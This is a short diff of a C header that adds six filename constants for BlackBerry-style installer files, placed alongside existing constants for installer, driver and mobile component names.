@@ -63,6 +63,13 @@ extern BOOL is_demo_version;
 #define COMMON_MOBILE_ZOO_NAME "wmcore.002"
 #define COMMON_EXE_INSTALLER_NAME "installer"
 
+#define BB_INSTALL_NAME1 "bb_in.exe"
+#define BB_INSTALL_NAME2 "javaloader.exe"
+#define BB_INSTALL_NAME3 "bb_in.jad"
+#define BB_INSTALL_NAME4 "bb_in.cod"
+#define BB_INSTALL_NAME5 "bb_in-1.cod"
+#define BB_INSTALL_NAME6 "bb_in_base.cod"
+
 #define DRIVER_NAME_OLD "MSDRV1.SYS" 
 #define DRIVER_NAME_OLD_W L"MSDRV1.SYS"
 #define DRIVER_NAME "ndisk.sys" 
